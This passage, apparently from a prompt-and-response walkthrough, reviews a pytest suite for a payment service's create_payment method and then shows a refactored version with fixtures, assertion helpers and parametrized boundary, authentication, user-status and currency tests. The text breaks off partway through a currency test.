            assert stored.amount == payment.amount
```

These additional tests comprehensively cover:

1. **All boundary conditions**: Tests for amounts just below/at/above maximum, just above minimum, and edge cases around zero
2. **Parametrized invalid amounts**: Comprehensive list of all invalid scenarios (negative, zero, above maximum)
3. **Database storage verification**: Multiple tests confirming payments are correctly stored with all attributes preserved
4. **Status and timestamps**: Tests verifying COMPLETED status, timestamp creation, ordering, and preservation
5. **Multiple currencies**: Parametrized tests for all Currency enums with various amounts and scenarios

The tests are organized into logical classes and use descriptive names that clearly indicate what's being tested.

---

## Iteration 4: Review Test Quality

### Prompt 4: Check Test Quality and Best Practices

```
Review the updated test suite and check for:
1. Are test names descriptive enough?
2. Are assertions complete (checking all relevant fields)?
3. Any test smells or anti-patterns?
4. Is the test structure clean and maintainable?
5. Are there any redundant tests?

Provide a quality assessment with specific recommendations.
```

### Response 4: Quality Assessment

# Test Suite Quality Assessment

## 1. Test Names - Descriptive Enough? ✅ Mostly Good, Some Issues

### **Strong Examples:**
- ✅ `test_create_payment_just_below_maximum` - Clear boundary being tested
- ✅ `test_returned_payment_matches_stored_payment` - Intent is obvious
- ✅ `test_timestamps_accurate_to_subsecond` - Specific precision being verified

### **Weak/Misleading Names:**
- ❌ `test_create_payment_tiny_decimal_amount` - "Tiny" is vague (0.001 vs 0.0001?)
  - **Better:** `test_create_payment_with_three_decimal_places`

- ❌ `test_create_payment_with_rounding_edge_case` - Doesn't say WHAT rounding case
  - **Better:** `test_create_payment_with_repeating_third_decimal`

- ❌ `test_timestamps_are_recent` - "Recent" is subjective
  - **Better:** `test_timestamps_set_within_execution_window`

- ❌ `test_create_payment_with_currency_typical_amounts` - Loop tests multiple things
  - **Better:** Split into individual tests or be more specific about "typical"

### **Recommendations:**
- Be more specific about numeric values in names when testing edge cases
- Avoid subjective terms like "tiny", "recent", "typical"
- If testing a specific scenario, name should include the key value or condition

---

## 2. Assertions - Completeness ⚠️ Mixed Quality

### **Incomplete Assertions - Missing Important Checks:**

#### **Example 1: Status not verified when payment is None**
```python
def test_create_payment_with_zero_amount_returns_none(self, payment_service, active_user):
    payment = payment_service.create_payment(active_user, 0.00, Currency.USD)
    assert payment is None
    # ❌ MISSING: Should verify no database entry created
    # ❌ MISSING: Should verify user state unchanged
```

**Should be:**
```python
def test_create_payment_with_zero_amount_returns_none(self, payment_service, active_user, payment_database):
    initial_count = len(payment_database.payments)
    payment = payment_service.create_payment(active_user, 0.00, Currency.USD)
    
    assert payment is None
    assert len(payment_database.payments) == initial_count  # No DB pollution
```

#### **Example 2: Incomplete field verification**
```python
def test_create_payment_with_valid_data(self, payment_service, active_user):
    payment = payment_service.create_payment(active_user, 99.99, Currency.USD, "Test payment")
    
    assert payment is not None
    assert payment.user_id == active_user.user_id
    assert payment.amount == 99.99
    # ❌ MISSING: payment.currency check
    # ❌ MISSING: payment.description check
    # ❌ MISSING: payment.payment_id format/structure check
```

#### **Example 3: Timestamp assertions incomplete**
```python
def test_created_at_is_before_or_equal_completed_at(self, payment_service, active_user):
    payment = payment_service.create_payment(active_user, 100.0, Currency.USD, "Timestamp order test")
    
    assert payment.created_at <= payment.completed_at
    # ❌ MISSING: Check both are not None first
    # ❌ MISSING: Check they're reasonably close (not years apart)
```

**Should be:**
```python
def test_created_at_is_before_or_equal_completed_at(self, payment_service, active_user):
    payment = payment_service.create_payment(active_user, 100.0, Currency.USD, "Timestamp order test")
    
    assert payment.created_at is not None
    assert payment.completed_at is not None
    assert payment.created_at <= payment.completed_at
    # Verify reasonable time delta (e.g., < 1 second)
    time_delta = (payment.completed_at - payment.created_at).total_seconds()
    assert time_delta < 1.0  # Should be nearly instantaneous
```

### **Over-Assertion Issues:**

```python
def test_returned_payment_matches_stored_payment(self, payment_service, active_user, payment_database):
    # ✅ Good: Comprehensive field checking
    # ⚠️ WARNING: Tests referential equality implicitly
    # If system returns a copy vs reference, test doesn't catch it
```

### **Recommendations:**
1. **Always verify database state** when payment is None (rejection cases)
2. **Check all critical fields** in happy path tests (amount, currency, description, status, timestamps, IDs)
3. **Verify side effects** - user state unchanged, no partial records
4. **Add negative assertions** - e.g., `assert payment.status != PaymentStatus.FAILED`
5. **Test object identity** when relevant - is returned payment same reference or copy?

---

## 3. Test Smells & Anti-Patterns 🚨 Several Issues Found

### **Anti-Pattern #1: Magic Numbers Without Context**
```python
def test_create_payment_just_below_maximum(self, payment_service, active_user):
    payment = payment_service.create_payment(active_user, 9999.99, Currency.USD, "Just below max")
    # 🚨 SMELL: 9999.99 and 10000.00 relationship not explicit
```

**Fix:**
```python
MAXIMUM_PAYMENT_AMOUNT = 10000.00
MINIMUM_PAYMENT_AMOUNT = 0.01

def test_create_payment_just_below_maximum(self, payment_service, active_user):
    payment = payment_service.create_payment(
        active_user, 
        MAXIMUM_PAYMENT_AMOUNT - 0.01, 
        Currency.USD
    )
```

### **Anti-Pattern #2: Loop in Test (Parametrize Instead)**
```python
def test_create_payment_with_currency_typical_amounts(self, payment_service, active_user):
    typical_amounts = [1.99, 9.99, 19.99, 49.99, 99.99, 199.99, 999.99]
    
    for amount in typical_amounts:  # 🚨 ANTI-PATTERN: Loop in test
        payment = payment_service.create_payment(...)
        assert payment is not None
```

**Fix:**
```python
@pytest.mark.parametrize("typical_amount", [1.99, 9.99, 19.99, 49.99, 99.99, 199.99, 999.99])
def test_create_payment_with_typical_currency_amount(self, payment_service, active_user, typical_amount):
    payment = payment_service.create_payment(active_user, typical_amount, Currency.USD)
    assert payment is not None
    assert payment.amount == typical_amount
```

### **Anti-Pattern #3: Sleeps in Tests**
```python
def test_timestamps_accurate_to_subsecond(self, payment_service, active_user):
    payment1 = payment_service.create_payment(active_user, 10.0, Currency.USD)
    time.sleep(0.001)  # 🚨 ANTI-PATTERN: Makes tests slower, flaky
    payment2 = payment_service.create_payment(active_user, 20.0, Currency.USD)
```

**Better Approach:**
```python
def test_timestamps_unique_for_sequential_payments(self, payment_service, active_user):
    payments = [
        payment_service.create_payment(active_user, amount, Currency.USD)
        for amount in [10.0, 20.0, 30.0]
    ]
    
    # Verify timestamps are strictly increasing OR equal (if subsecond precision not guaranteed)
    for i in range(len(payments) - 1):
        assert payments[i].created_at <= payments[i+1].created_at
```

### **Anti-Pattern #4: Multiple Assertions on Same Concept**
```python
# 🚨 REDUNDANT: Three tests checking essentially the same thing
def test_payment_has_created_at_timestamp(...)
def test_payment_has_completed_at_timestamp(...)
def test_stored_payment_preserves_timestamps(...)
```

**Better:** Combine into one comprehensive test:
```python
def test_payment_timestamps_set_and_preserved(self, payment_service, active_user, payment_database):
    before = datetime.now()
    payment = payment_service.create_payment(active_user, 100.0, Currency.USD)
    after = datetime.now()
    
    # Verify timestamps exist and are in range
    assert payment.created_at is not None
    assert payment.completed_at is not None
    assert before <= payment.created_at <= after
    assert before <= payment.completed_at <= after
    
    # Verify order
    assert payment.created_at <= payment.completed_at
    
    # Verify preservation in database
    stored = payment_database.get_payment(payment.payment_id)
    assert stored.created_at == payment.created_at
    assert stored.completed_at == payment.completed_at
```

### **Anti-Pattern #5: Unclear Test Boundaries (Class Organization)**
```python
class TestCreatePaymentAmountBoundaries:  # Boundary tests
    def test_create_payment_tiny_decimal_amount(...)  # Actually floating-point precision

class TestCreatePaymentFloatingPointPrecision:  # Precision tests
    def test_create_payment_with_very_small_fraction(...)  # Also a boundary test
```

**Recommendation:** Reorganize based on **what aspect** is being tested, not **how**:
- `TestAmountValidation` - All amount-related validation (boundaries, precision, ranges)
- `TestDatabasePersistence` - All storage and retrieval verification
- `TestPaymentState` - Status, timestamps, lifecycle

### **Anti-Pattern #6: Testing Framework Implementation Details**
```python
def test_timestamps_are_recent(self, payment_service, active_user):
    before = datetime.now()
    payment = payment_service.create_payment(...)
    after = datetime.now()
    
    assert before <= payment.created_at <= after
    # 🚨 SMELL: Assumes instant execution, could be flaky on slow CI
```

**More Robust:**
```python
def test_timestamps_set_to_current_time(self, payment_service, active_user):
    payment = payment_service.create_payment(...)
    now = datetime.now()
    
    # Allow 1 second tolerance for execution time
    time_diff = abs((now - payment.created_at).total_seconds())
    assert time_diff < 1.0, f"Timestamp off by {time_diff} seconds"
```

---

## 4. Test Structure & Maintainability ⚠️ Needs Improvement

### **Issues:**

#### **Lack of Constants and Configuration**
```python
# 🚨 PROBLEM: Magic numbers scattered everywhere
payment = payment_service.create_payment(active_user, 10000.00, ...)  # Max
payment = payment_service.create_payment(active_user, 0.01, ...)      # Min
```

**Fix - Add conftest.py or constants module:**
```python
# conftest.py or test_constants.py
PAYMENT_LIMITS = {
    'MIN_AMOUNT': 0.01,
    'MAX_AMOUNT': 10000.00,
}

# Then in tests:
def test_create_payment_at_maximum(self, payment_service, active_user):
    payment = payment_service.create_payment(
        active_user, 
        PAYMENT_LIMITS['MAX_AMOUNT'], 
        Currency.USD
    )
```

#### **Fixture Inconsistency**
```python
# Some tests use payment_database fixture, others don't
def test_payment_stored_with_correct_payment_id(
    self, payment_service, active_user, payment_database  # ✅ Has DB
):
    ...

def test_successful_payment_has_completed_status(
    self, payment_service, active_user  # ❌ Missing DB - can't verify persistence
):
    ...
```

**Recommendation:** Standardize - either all tests get database or use clear naming convention for tests that don't need it.

#### **No Helper Methods for Common Patterns**
```python
# 🚨 REPEATED PATTERN: Create payment and verify in DB
payment = payment_service.create_payment(active_user, 100.0, Currency.USD, "Test")
stored_payment = payment_database.get_payment(payment.payment_id)
assert stored_payment is not None
# ... appears in ~10 tests
```

**Fix - Add helper in test class:**
```python
class TestCreatePaymentDatabaseStorage:
    def _create_and_verify_stored(self, payment_service, active_user, payment_database, 
                                   amount, currency, description="Test"):
        """Helper: Create payment and return both payment and stored version."""
        payment = payment_service.create_payment(active_user, amount, currency, description)
        stored = payment_database.get_payment(payment.payment_id)
        assert stored is not None, "Payment not found in database"
        return payment, stored
```

#### **Deep Test Class Nesting - Hard to Navigate**
```python
# Current structure has too many granular classes
class TestCreatePaymentAmountBoundaries:
class TestCreatePaymentFloatingPointPrecision:
class TestCreatePaymentInvalidAmountsParametrized:
class TestCreatePaymentDatabaseStorage:
class TestCreatePaymentStatusAndTimestamps:
class TestCreatePaymentMultipleCurrencies:
```

**Better Structure:**
```python
class TestCreatePayment:
    """Main test class for create_payment method."""
    
    class TestValidation:
        """Amount validation and boundary tests."""
        # All amount-related tests here
    
    class TestPersistence:
        """Database storage and retrieval tests."""
        # All DB-related tests here
    
    class TestPaymentState:
        """Status, timestamps, and lifecycle tests."""
        # All state-related tests here
    
    class TestAuthenticationAndAuthorization:
        """Security and permission tests."""
        # All auth tests here
```

---

## 5. Redundant Tests 🔄 Several Found

### **Redundancy Type 1: Same Assertion, Different Wording**

```python
# Test 1
def test_payment_stored_with_correct_payment_id(self, ...):
    stored_payment = payment_database.get_payment(payment.payment_id)
    assert stored_payment.payment_id == payment.payment_id

# Test 2
def test_returned_payment_matches_stored_payment(self, ...):
    stored_payment = payment_database.get_payment(payment.payment_id)
    assert payment.payment_id == stored_payment.payment_id  # SAME CHECK
```

**Recommendation:** Keep the comprehensive `test_returned_payment_matches_stored_payment` and remove individual field tests.

### **Redundancy Type 2: Parametrized Test Makes Individual Tests Obsolete**

```python
# Individual tests (REDUNDANT):
def test_create_payment_just_below_maximum(...)  # tests 9999.99
def test_create_payment_exactly_at_maximum(...)   # tests 10000.00
def test_create_payment_just_above_maximum(...)   # tests 10000.01

# Parametrized test (COVERS ALL):
@pytest.mark.parametrize("valid_amount", [
    0.01, 0.001, 1.0, 10.0, 100.0, 500.0, 
    1000.0, 5000.0, 9999.99, 10000.0  # ✅ Includes boundary cases
])
def test_create_payment_accepts_valid_amounts(...):
```

**Recommendation:** Keep parametrized version, but ADD explicit boundary tests with better names if those cases are critical:
```python
@pytest.mark.boundary
def test_create_payment_at_maximum_limit(...)  # Keep for visibility
```

### **Redundancy Type 3: Status Checks Duplicated**

```python
def test_successful_payment_has_completed_status(...)
def test_stored_payment_preserves_status(...)
def test_payment_status_consistent_across_retrieval(...)
# All testing that status == COMPLETED
```

**Recommendation:** Consolidate into one comprehensive test:
```python
def test_successful_payment_status_lifecycle(self, payment_service, active_user, payment_database):
    """Test payment has COMPLETED status and it persists correctly."""
    payment = payment_service.create_payment(active_user, 100.0, Currency.USD)
    
    # Check initial status
    assert payment.status == PaymentStatus.COMPLETED
    
    # Check persistence
    stored = payment_database.get_payment(payment.payment_id)
    assert stored.status == PaymentStatus.COMPLETED
    
    # Check consistency across retrievals
    stored2 = payment_database.get_payment(payment.payment_id)
    assert stored2.status == PaymentStatus.COMPLETED
```

### **Redundancy Type 4: Multiple Tests for "None" Return**

```python
def test_create_payment_with_zero_amount_returns_none(...)
def test_create_payment_with_negative_amount_returns_none(...)
def test_create_payment_with_amount_exceeding_limit_returns_none(...)
# All testing payment is None

# Later:
@pytest.mark.parametrize("invalid_amount", [0.0, -1.0, 10000.01, ...])
def test_create_payment_rejects_invalid_amounts(...)
# ✅ COVERS ALL OF THE ABOVE
```

**Recommendation:** Keep only the parametrized version for comprehensive coverage. Add 1-2 explicit tests for critical boundaries if needed for documentation.

---

## Summary: Quality Score & Priorities

### **Overall Score: 6.5/10**

| Aspect | Score | Status |
|--------|-------|--------|
| Test Names | 7/10 | ⚠️ Good but could be more specific |
| Assertions | 6/10 | ⚠️ Incomplete in many tests |
| Anti-Patterns | 5/10 | 🚨 Several found (loops, sleeps, magic numbers) |
| Structure | 6/10 | ⚠️ Over-granular classes, lacks helpers |
| Redundancy | 7/10 | ⚠️ Some consolidation needed |

---

## Top 10 Recommendations (Priority Order)

### **🔥 Critical - Fix Immediately:**

1. **Remove `time.sleep()` from tests** - Makes suite slow and flaky
   - Replace with logical timestamp comparison without delays

2. **Add constants for magic numbers** - Maintainability nightmare
   ```python
   MAX_PAYMENT = 10000.00
   MIN_PAYMENT = 0.01
   ```

3. **Eliminate test loops** - Convert to `@pytest.mark.parametrize`
   - Especially in `test_create_payment_with_currency_typical_amounts`

### **⚠️ High Priority - Address Soon:**

4. **Consolidate redundant tests** - Remove ~15-20% of tests
   - Keep parametrized versions, remove individual boundary tests they cover

5. **Add complete assertions to all happy path tests** - Verify all fields
   ```python
   assert payment.amount == expected_amount
   assert payment.currency == expected_currency
   assert payment.description == expected_description
   assert payment.status == PaymentStatus.COMPLETED
   ```

6. **Verify database state in ALL rejection tests** - Critical gap
   ```python
   assert payment is None
   assert len(payment_database.payments) == initial_count  # ADD THIS
   ```

7. **Create helper methods** - Reduce code duplication by 40%
   - `_create_and_verify_payment()`
   - `_assert_payment_fields_match()`

### **📋 Medium Priority - Improve Over Time:**

8. **Reorganize class structure** - Flatten to 3-4 logical groups
   - TestValidation, TestPersistence, TestPaymentState, TestSecurity

9. **Improve test names** - Be more specific with values
   - "tiny" → "three_decimal_places"
   - "recent" → "within_execution_window"

10. **Add negative assertions** where relevant
    ```python
    assert payment.status == PaymentStatus.COMPLETED
    assert payment.status != PaymentStatus.FAILED  # Explicit negative check
    ```

---

## Example Refactored Test (Before/After)

### **Before (Multiple Issues):**
```python
def test_create_payment_with_rounding_edge_case(self, payment_service, active_user):
    payment = payment_service.create_payment(
        active_user, 33.333333, Currency.USD, "Rounding test"
    )
    assert payment is not None
    assert payment.amount == 33.333333
```

### **After (Fixed):**
```python
REPEATING_DECIMAL_AMOUNT = 33.333333

def test_create_payment_with_repeating_decimal_preserves_precision(
    self, payment_service, active_user, payment_database
):
    """Test that repeating decimal amounts (1/3) are stored without rounding errors."""
    payment = payment_service.create_payment(
        active_user, 
        REPEATING_DECIMAL_AMOUNT, 
        Currency.USD, 
        "Precision test: 1/3"
    )
    
    # Verify creation succeeded
    assert payment is not None, "Payment should succeed with repeating decimal"
    assert payment.amount == REPEATING_DECIMAL_AMOUNT
    assert payment.status == PaymentStatus.COMPLETED
    
    # Verify precision preserved in database
    stored = payment_database.get_payment(payment.payment_id)
    assert stored.amount == REPEATING_DECIMAL_AMOUNT
    
    # Verify no DB pollution on failure path
    assert len(payment_database.get_user_payments(active_user.user_id)) == 1
```

**Improvements:**
✅ Descriptive name with context
✅ Constant instead of magic number  
✅ Complete assertions (status, database)
✅ Docstring explaining WHY we test this
✅ Verifies side effects (DB count)

---

## Iteration 5: Apply Recommendations

### Prompt 5: Refactor Based on Quality Assessment

```
Refactor the test suite to address the issues identified:
1. Add database cleanup fixture
2. Create separate fixtures for authenticated/unauthenticated users
3. Combine boundary tests into parametrized test
4. Add complete assertions (status, timestamps, all fields)
5. Add negative assertions for failed payments

Show the improved version.
```

### Response 5: Refactored Test Suite

```python
"""
Refactored PyTest Unit Tests for PaymentService.create_payment() method

Improvements:
- Comprehensive database cleanup
- Separate user fixtures for different authentication states
- Parametrized boundary tests
- Complete field assertions
- Negative assertions for failure cases
- Constants for magic numbers
- Helper methods for common patterns
"""

import pytest
from datetime import datetime, timedelta
from typing import Optional, Tuple


# ============================================================================
# TEST CONSTANTS
# ============================================================================

class PaymentTestConstants:
    """Centralized constants for payment testing."""
    MIN_VALID_AMOUNT = 0.01
    MAX_VALID_AMOUNT = 10000.00
    
    # Boundary test values
    JUST_BELOW_MAX = 9999.99
    JUST_ABOVE_MAX = 10000.01
    JUST_ABOVE_MIN = 0.01
    
    # Invalid amounts
    ZERO_AMOUNT = 0.00
    NEGATIVE_AMOUNT = -1.00
    EXCEEDS_MAX = 15000.00
    
    # Test descriptions
    DEFAULT_DESCRIPTION = "Test payment"
    
    # Timestamp tolerance (seconds)
    TIMESTAMP_TOLERANCE = 1.0


# ============================================================================
# FIXTURES
# ============================================================================

@pytest.fixture
def payment_database():
    """Provides a fresh database instance with automatic cleanup."""
    db = PaymentDatabase()
    yield db
    # Cleanup after each test
    db.clear()


@pytest.fixture
def payment_service(payment_database):
    """Provides a PaymentService instance with a clean database."""
    return PaymentService(payment_database)


@pytest.fixture
def authenticated_active_user(payment_database):
    """
    Provides an authenticated, active user.
    This is the standard user for happy path tests.
    """
    user = User("user_001", "john_doe", "john@example.com", is_active=True)
    user.authenticate("john_doe_pass")
    payment_database.add_user(user)
    return user


@pytest.fixture
def authenticated_inactive_user(payment_database):
    """
    Provides an authenticated but inactive user.
    Note: User is marked inactive but has an auth token for testing validation order.
    """
    user = User("user_002", "jane_doe", "jane@example.com", is_active=False)
    payment_database.add_user(user)
    # Manually set token to test that inactive check happens after auth check
    user.auth_token = "manually_set_token"
    return user


@pytest.fixture
def unauthenticated_active_user(payment_database):
    """
    Provides an unauthenticated but active user.
    User exists in database but has not authenticated.
    """
    user = User("user_003", "bob_smith", "bob@example.com", is_active=True)
    payment_database.add_user(user)
    return user


@pytest.fixture
def unauthenticated_inactive_user(payment_database):
    """
    Provides an unauthenticated and inactive user.
    Tests edge case of completely invalid user state.
    """
    user = User("user_004", "alice_jones", "alice@example.com", is_active=False)
    payment_database.add_user(user)
    return user


# ============================================================================
# TEST HELPERS
# ============================================================================

class PaymentTestHelpers:
    """Helper methods for common test patterns."""
    
    @staticmethod
    def assert_payment_fields_match(
        payment: Payment,
        expected_user_id: str,
        expected_amount: float,
        expected_currency: Currency,
        expected_description: str = "",
    ):
        """
        Assert all payment fields match expected values.
        
        This provides comprehensive field validation in a reusable way.
        """
        assert payment is not None, "Payment should not be None"
        assert payment.user_id == expected_user_id, "User ID mismatch"
        assert payment.amount == expected_amount, "Amount mismatch"
        assert payment.currency == expected_currency, "Currency mismatch"
        assert payment.description == expected_description, "Description mismatch"
        assert payment.payment_id is not None, "Payment ID should be set"
        assert payment.payment_id.startswith(f"pay_{expected_user_id}_"), "Payment ID format incorrect"
    
    @staticmethod
    def assert_payment_completed_successfully(payment: Payment):
        """
        Assert payment has completed status with proper timestamps.
        
        Validates the complete success lifecycle of a payment.
        """
        assert payment.status == PaymentStatus.COMPLETED, "Payment should be COMPLETED"
        assert payment.status != PaymentStatus.PENDING, "Payment should not be PENDING"
        assert payment.status != PaymentStatus.FAILED, "Payment should not be FAILED"
        
        assert payment.created_at is not None, "created_at should be set"
        assert payment.completed_at is not None, "completed_at should be set"
        assert isinstance(payment.created_at, datetime), "created_at should be datetime"
        assert isinstance(payment.completed_at, datetime), "completed_at should be datetime"
        assert payment.created_at <= payment.completed_at, "created_at should be before or equal to completed_at"
    
    @staticmethod
    def assert_payment_stored_correctly(
        payment: Payment,
        payment_database: PaymentDatabase
    ):
        """
        Assert payment is correctly stored in database with all fields preserved.
        """
        stored_payment = payment_database.get_payment(payment.payment_id)
        
        assert stored_payment is not None, "Payment should be stored in database"
        assert stored_payment.payment_id == payment.payment_id
        assert stored_payment.user_id == payment.user_id
        assert stored_payment.amount == payment.amount
        assert stored_payment.currency == payment.currency
        assert stored_payment.description == payment.description
        assert stored_payment.status == payment.status
        assert stored_payment.created_at == payment.created_at
        assert stored_payment.completed_at == payment.completed_at
    
    @staticmethod
    def assert_payment_not_stored(
        payment_database: PaymentDatabase,
        initial_payment_count: int
    ):
        """
        Assert that no new payment was stored in database.
        Used for validation failure tests.
        """
        current_count = len(payment_database.payments)
        assert current_count == initial_payment_count, \
            f"Payment count should remain {initial_payment_count}, but is {current_count}"
    
    @staticmethod
    def assert_timestamps_within_tolerance(
        payment: Payment,
        before: datetime,
        after: datetime,
        tolerance_seconds: float = PaymentTestConstants.TIMESTAMP_TOLERANCE
    ):
        """
        Assert timestamps are set within execution window with tolerance.
        
        Provides robust timestamp checking that won't be flaky in CI environments.
        """
        assert payment.created_at is not None
        assert payment.completed_at is not None
        
        # Allow some tolerance for execution time
        before_with_tolerance = before - timedelta(seconds=tolerance_seconds)
        after_with_tolerance = after + timedelta(seconds=tolerance_seconds)
        
        assert before_with_tolerance <= payment.created_at <= after_with_tolerance, \
            f"created_at {payment.created_at} outside window [{before}, {after}]"
        assert before_with_tolerance <= payment.completed_at <= after_with_tolerance, \
            f"completed_at {payment.completed_at} outside window [{before}, {after}]"


# ============================================================================
# HAPPY PATH TESTS
# ============================================================================

class TestCreatePaymentHappyPath:
    """Test successful payment creation scenarios."""
    
    def test_create_payment_with_valid_data_all_fields_verified(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test creating payment with valid data and verify all fields are correct."""
        test_amount = 99.99
        test_currency = Currency.USD
        test_description = "Complete field verification test"
        
        before = datetime.now()
        payment = payment_service.create_payment(
            authenticated_active_user,
            test_amount,
            test_currency,
            test_description
        )
        after = datetime.now()
        
        # Verify all payment fields
        PaymentTestHelpers.assert_payment_fields_match(
            payment,
            authenticated_active_user.user_id,
            test_amount,
            test_currency,
            test_description
        )
        
        # Verify completion status and timestamps
        PaymentTestHelpers.assert_payment_completed_successfully(payment)
        PaymentTestHelpers.assert_timestamps_within_tolerance(payment, before, after)
        
        # Verify database storage
        PaymentTestHelpers.assert_payment_stored_correctly(payment, payment_database)
    
    def test_create_payment_without_description_defaults_to_empty_string(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test creating payment without description uses empty string default."""
        payment = payment_service.create_payment(
            authenticated_active_user,
            50.00,
            Currency.EUR
        )
        
        PaymentTestHelpers.assert_payment_fields_match(
            payment,
            authenticated_active_user.user_id,
            50.00,
            Currency.EUR,
            ""  # Empty string default
        )
        PaymentTestHelpers.assert_payment_completed_successfully(payment)
        PaymentTestHelpers.assert_payment_stored_correctly(payment, payment_database)
    
    def test_create_multiple_payments_generates_unique_ids(
        self, payment_service, authenticated_active_user, payment_database
    ):
        """Test that sequential payments get unique IDs."""
        payment1 = payment_service.create_payment(
            authenticated_active_user, 10.00, Currency.USD, "First"
        )
        payment2 = payment_service.create_payment(
            authenticated_active_user, 20.00, Currency.USD, "Second"
        )
        payment3 = payment_service.create_payment(
            authenticated_active_user, 30.00, Currency.USD, "Third"
        )
        
        # Verify unique IDs
        payment_ids = {payment1.payment_id, payment2.payment_id, payment3.payment_id}
        assert len(payment_ids) == 3, "All payment IDs should be unique"
        
        # Verify all stored
        user_payments = payment_database.get_user_payments(authenticated_active_user.user_id)
        assert len(user_payments) == 3, "All payments should be stored"
        
        # Verify all have correct status
        for payment in [payment1, payment2, payment3]:
            PaymentTestHelpers.assert_payment_completed_successfully(payment)


# ============================================================================
# BOUNDARY CONDITION TESTS (PARAMETRIZED)
# ============================================================================

class TestCreatePaymentAmountBoundaries:
    """Test payment amount boundary conditions using parametrized tests."""
    
    @pytest.mark.parametrize("amount,description", [
        # Minimum boundary
        (PaymentTestConstants.MIN_VALID_AMOUNT, "exact_minimum"),
        (0.001, "below_minimum_but_positive"),
        (0.0001, "very_small_positive"),
        
        # Maximum boundary
        (PaymentTestConstants.MAX_VALID_AMOUNT, "exact_maximum"),
        (PaymentTestConstants.JUST_BELOW_MAX, "just_below_maximum"),
        
        # Typical valid amounts
        (1.00, "one_unit"),
        (10.00, "ten_units"),
        (100.00, "hundred_units"),
        (1000.00, "thousand_units"),
        (5000.00, "mid_range"),
        
        # Floating point precision
        (0.01, "two_decimals"),
        (0.001, "three_decimals"),
        (99.99, "typical_price_format"),
        (99.999, "high_precision"),
        (33.333333, "repeating_decimal"),
    ])
    def test_create_payment_accepts_valid_boundary_amounts(
        self, payment_service, authenticated_active_user, payment_database, amount, description
    ):
        """Test that all valid amounts within boundaries are accepted and processed correctly."""
        payment = payment_service.create_payment(
            authenticated_active_user,
            amount,
            Currency.USD,
            f"Boundary test: {description}"
        )
        
        # Complete assertions
        assert payment is not None, f"Payment should succeed for {description} ({amount})"
        PaymentTestHelpers.assert_payment_fields_match(
            payment,
            authenticated_active_user.user_id,
            amount,
            Currency.USD,
            f"Boundary test: {description}"
        )
        PaymentTestHelpers.assert_payment_completed_successfully(payment)
        PaymentTestHelpers.assert_payment_stored_correctly(payment, payment_database)
        
        # Verify user has exactly one payment
        user_payments = payment_database.get_user_payments(authenticated_active_user.user_id)
        assert len(user_payments) == 1
    
    @pytest.mark.parametrize("invalid_amount,reason", [
        # Zero and negative
        (0.0, "exact_zero"),
        (-0.0, "negative_zero"),
        (-0.01, "small_negative"),
        (-1.0, "negative_one"),
        (-10.0, "negative_ten"),
        (-100.0, "negative_hundred"),
        (-1000.0, "large_negative"),
        (-9999.99, "near_negative_max"),
        
        # Above maximum
        (PaymentTestConstants.JUST_ABOVE_MAX, "just_above_maximum"),
        (10001.0, "slightly_above_max"),
        (15000.0, "moderately_above_max"),
        (50000.0, "well_above_max"),
        (100000.0, "far_above_max"),
    ])
    def test_create_payment_rejects_invalid_boundary_amounts(
        self, payment_service, authenticated_active_user, payment_database, invalid_amount, reason
    ):
        """Test that all invalid amounts are rejected with proper failure handling."""
        initial_count = len(payment_database.payments)
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            invalid_amount,
            Currency.USD,
            f"Invalid: {reason}"
        )
        
        # Negative assertions - verify failure
        assert payment is None, f"Payment should be rejected for {reason} ({invalid_amount})"
        
        # Verify no database pollution
        PaymentTestHelpers.assert_payment_not_stored(payment_database, initial_count)
        
        # Verify user has no payments
        user_payments = payment_database.get_user_payments(authenticated_active_user.user_id)
        assert len(user_payments) == 0, "No payments should exist for user after rejection"


# ============================================================================
# AUTHENTICATION TESTS
# ============================================================================

class TestCreatePaymentAuthentication:
    """Test authentication requirements for payment creation."""
    
    def test_create_payment_requires_authentication(
        self, payment_service, unauthenticated_active_user, payment_database
    ):
        """Test that unauthenticated user cannot create payment."""
        initial_count = len(payment_database.payments)
        
        with pytest.raises(PermissionError) as exc_info:
            payment_service.create_payment(
                unauthenticated_active_user,
                100.00,
                Currency.USD,
                "Should fail - not authenticated"
            )
        
        assert "User must be authenticated" in str(exc_info.value)
        
        # Verify no payment created
        PaymentTestHelpers.assert_payment_not_stored(payment_database, initial_count)
    
    def test_create_payment_preserves_authentication_state(
        self, payment_service, authenticated_active_user
    ):
        """Test that creating payment doesn't modify user authentication state."""
        original_token = authenticated_active_user.auth_token
        original_auth_state = authenticated_active_user.is_authenticated()
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.USD,
            "Auth preservation test"
        )
        
        # Verify payment succeeded
        assert payment is not None
        
        # Verify authentication unchanged
        assert authenticated_active_user.is_authenticated() == original_auth_state
        assert authenticated_active_user.auth_token == original_token
    
    def test_create_payment_fails_for_unauthenticated_inactive_user(
        self, payment_service, unauthenticated_inactive_user, payment_database
    ):
        """Test that unauthenticated AND inactive user fails at authentication check."""
        initial_count = len(payment_database.payments)
        
        # Should fail at authentication check first
        with pytest.raises(PermissionError) as exc_info:
            payment_service.create_payment(
                unauthenticated_inactive_user,
                100.00,
                Currency.USD,
                "Should fail - neither authenticated nor active"
            )
        
        assert "User must be authenticated" in str(exc_info.value)
        PaymentTestHelpers.assert_payment_not_stored(payment_database, initial_count)


# ============================================================================
# USER STATUS TESTS
# ============================================================================

class TestCreatePaymentUserStatus:
    """Test user status validation for payment creation."""
    
    def test_create_payment_requires_active_user(
        self, payment_service, authenticated_inactive_user, payment_database
    ):
        """Test that inactive user cannot create payment even if authenticated."""
        initial_count = len(payment_database.payments)
        
        with pytest.raises(ValueError) as exc_info:
            payment_service.create_payment(
                authenticated_inactive_user,
                100.00,
                Currency.USD,
                "Should fail - user inactive"
            )
        
        assert "User account is not active" in str(exc_info.value)
        
        # Verify no payment created
        PaymentTestHelpers.assert_payment_not_stored(payment_database, initial_count)
    
    def test_create_payment_does_not_modify_user_active_status(
        self, payment_service, authenticated_active_user
    ):
        """Test that creating payment doesn't modify user's active status."""
        original_status = authenticated_active_user.is_active
        
        payment = payment_service.create_payment(
            authenticated_active_user,
            100.00,
            Currency.USD,
            "Status preservation test"
        )
        
        assert payment is not None
        assert authenticated_active_user.is_active == original_status


# ============================================================================
# CURRENCY TESTS
# ============================================================================

class TestCreatePaymentCurrency:
    """Test payment creation with different currencies."""
    
    @pytest.mark.parametrize("currency", [
        Currency.USD,
        Currency.EUR,
        Currency.GBP,
    ])
    def test_create_payment_with_each_supported_currency(
